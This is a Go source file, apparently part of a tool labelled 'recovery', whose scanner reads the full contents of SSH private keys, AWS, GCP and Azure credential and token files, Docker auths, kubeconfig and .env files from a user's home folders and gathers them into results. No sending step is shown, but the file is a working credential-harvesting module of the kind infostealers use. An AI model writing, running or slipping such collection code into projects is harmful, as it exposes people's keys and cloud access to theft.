package scanner

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"recovery/recovery/types"
)

const maxKeyFileSize = 512 * 1024 // 512KB

func gcpConfigDir(home string) string {
	if runtime.GOOS == "windows" {
		return filepath.Join(home, "AppData", "Roaming", "gcloud")
	}
	return filepath.Join(home, ".config", "gcloud")
}

func ScanKeys() []types.KeyResult {
	var results []types.KeyResult
	home, _ := os.UserHomeDir()
	if home == "" {
		return nil
	}

	results = append(results, scanSSHKeys(home)...)
	results = append(results, scanAWSCredentials(home)...)
	results = append(results, scanGCPCredentials(home)...)
	results = append(results, scanAzureCredentials(home)...)
	results = append(results, scanDockerCredentials(home)...)
	results = append(results, scanKubeConfig(home)...)
	results = append(results, scanEnvFiles(home)...)

	return results
}

func scanSSHKeys(home string) []types.KeyResult {
	sshDir := filepath.Join(home, ".ssh")
	entries, err := os.ReadDir(sshDir)
	if err != nil {
		return nil
	}

	var results []types.KeyResult
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		if name == "known_hosts" || name == "authorized_keys" || strings.HasSuffix(name, ".pub") || name == "config" {
			continue
		}

		path := filepath.Join(sshDir, name)
		info, err := e.Info()
		if err != nil || info.Size() > maxKeyFileSize || info.Size() == 0 {
			continue
		}

		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		content := string(data)

		if isPrivateKey(content) {
			results = append(results, types.KeyResult{
				Type:    "ssh",
				Name:    name,
				Path:    path,
				Size:    info.Size(),
				Content: content,
			})
		}
	}

	configPath := filepath.Join(sshDir, "config")
	if info, err := os.Stat(configPath); err == nil && info.Size() < maxKeyFileSize {
		if data, err := os.ReadFile(configPath); err == nil && len(data) > 0 {
			results = append(results, types.KeyResult{
				Type:    "ssh_config",
				Name:    "config",
				Path:    configPath,
				Size:    info.Size(),
				Content: string(data),
			})
		}
	}

	return results
}

func isPrivateKey(content string) bool {
	markers := []string{
		"-----BEGIN OPENSSH PRIVATE KEY-----",
		"-----BEGIN RSA PRIVATE KEY-----",
		"-----BEGIN EC PRIVATE KEY-----",
		"-----BEGIN DSA PRIVATE KEY-----",
		"-----BEGIN PRIVATE KEY-----",
		"-----BEGIN ENCRYPTED PRIVATE KEY-----",
		"PuTTY-User-Key-File-",
	}
	for _, m := range markers {
		if strings.Contains(content, m) {
			return true
		}
	}
	return false
}

func scanAWSCredentials(home string) []types.KeyResult {
	var results []types.KeyResult
	awsDir := filepath.Join(home, ".aws")

	for _, name := range []string{"credentials", "config"} {
		path := filepath.Join(awsDir, name)
		info, err := os.Stat(path)
		if err != nil || info.Size() > maxKeyFileSize || info.Size() == 0 {
			continue
		}
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		results = append(results, types.KeyResult{
			Type:    "aws",
			Name:    name,
			Path:    path,
			Size:    info.Size(),
			Content: string(data),
		})
	}

	return results
}

func scanGCPCredentials(home string) []types.KeyResult {
	var results []types.KeyResult

	gcpDir := gcpConfigDir(home)
	candidates := []string{
		filepath.Join(gcpDir, "application_default_credentials.json"),
		filepath.Join(gcpDir, "credentials.db"),
		filepath.Join(gcpDir, "properties"),
	}

	for _, dir := range []string{
		filepath.Join(home, "Desktop"),
		filepath.Join(home, "Documents"),
		filepath.Join(home, "Downloads"),
	} {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			name := e.Name()
			if strings.HasSuffix(name, ".json") && (strings.Contains(name, "service") || strings.Contains(name, "gcp") || strings.Contains(name, "google")) {
				candidates = append(candidates, filepath.Join(dir, name))
			}
		}
	}

	for _, path := range candidates {
		info, err := os.Stat(path)
		if err != nil || info.Size() > maxKeyFileSize || info.Size() == 0 {
			continue
		}
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		content := string(data)
		if strings.Contains(content, "client_secret") || strings.Contains(content, "private_key") || strings.Contains(content, "type") {
			results = append(results, types.KeyResult{
				Type:    "gcp",
				Name:    filepath.Base(path),
				Path:    path,
				Size:    info.Size(),
				Content: content,
			})
		}
	}

	return results
}

func scanAzureCredentials(home string) []types.KeyResult {
	var results []types.KeyResult

	azureDir := filepath.Join(home, ".azure")
	candidates := []string{
		filepath.Join(azureDir, "accessTokens.json"),
		filepath.Join(azureDir, "azureProfile.json"),
		filepath.Join(azureDir, "msal_token_cache.json"),
		filepath.Join(azureDir, "service_principal_entries.json"),
	}

	for _, path := range candidates {
		info, err := os.Stat(path)
		if err != nil || info.Size() > maxKeyFileSize || info.Size() == 0 {
			continue
		}
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		results = append(results, types.KeyResult{
			Type:    "azure",
			Name:    filepath.Base(path),
			Path:    path,
			Size:    info.Size(),
			Content: string(data),
		})
	}

	return results
}

func scanDockerCredentials(home string) []types.KeyResult {
	var results []types.KeyResult

	path := filepath.Join(home, ".docker", "config.json")
	info, err := os.Stat(path)
	if err != nil || info.Size() > maxKeyFileSize || info.Size() == 0 {
		return nil
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}
	if strings.Contains(string(data), "auths") {
		results = append(results, types.KeyResult{
			Type:    "docker",
			Name:    "config.json",
			Path:    path,
			Size:    info.Size(),
			Content: string(data),
		})
	}
	return results
}

func scanKubeConfig(home string) []types.KeyResult {
	var results []types.KeyResult

	path := filepath.Join(home, ".kube", "config")
	info, err := os.Stat(path)
	if err != nil || info.Size() > maxKeyFileSize || info.Size() == 0 {
		return nil
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}
	results = append(results, types.KeyResult{
		Type:    "kubernetes",
		Name:    "config",
		Path:    path,
		Size:    info.Size(),
		Content: string(data),
	})
	return results
}

func scanEnvFiles(home string) []types.KeyResult {
	var results []types.KeyResult

	searchDirs := []string{
		filepath.Join(home, "Desktop"),
		filepath.Join(home, "Documents"),
		filepath.Join(home, "Downloads"),
	}

	for _, dir := range searchDirs {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			name := e.Name()
			if name != ".env" && !strings.HasPrefix(name, ".env.") {
				continue
			}
			path := filepath.Join(dir, name)
			info, err := e.Info()
			if err != nil || info.Size() > maxKeyFileSize || info.Size() == 0 {
				continue
			}
			data, err := os.ReadFile(path)
			if err != nil {
				continue
			}
			results = append(results, types.KeyResult{
				Type:    "env",
				Name:    name,
				Path:    path,
				Size:    info.Size(),
				Content: string(data),
			})
		}
	}

	return results
}
